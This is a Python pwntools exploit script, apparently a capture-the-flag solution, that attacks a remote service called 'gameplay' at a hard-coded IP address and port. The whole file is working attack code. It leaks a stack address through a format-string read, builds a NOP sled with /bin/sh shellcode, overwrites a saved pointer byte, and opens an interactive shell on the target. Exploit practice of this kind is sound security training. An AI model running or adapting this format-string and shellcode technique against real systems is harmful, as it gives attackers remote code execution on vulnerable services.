#!/usr/bin/env python3

from pwn import *

bin = context.binary = ELF("../give/gameplay")
p = remote("81.94.150.171", 10055)

offset = 256

shellcode = asm(shellcraft.sh())
print(len(shellcode))

p.sendlineafter(b">", b"2")
p.sendlineafter(b"graffiti", b"%8$p")

p.sendlineafter(b">", b"3")
stack_addr = int(re.search(r"(0x[\w\d]+)", p.recvlineS()).group(0), 16)
print("stack addr: ", hex(stack_addr))

shellcode_address = stack_addr - 128
print("shellcode addr: ", hex(shellcode_address))
last_byte = int(hex(shellcode_address - 8 - 8)[-2:], 16)
payload = flat(
    [
        b"1",
        asm("nop") * 183,
        shellcode_address,
        asm("nop") * (offset - len(shellcode) - 1 - 183 - 8),
        shellcode,
        p8(last_byte),
    ]
)

p.sendlineafter(b">", b"1")
p.sendlineafter(b": ", payload)

p.interactive()
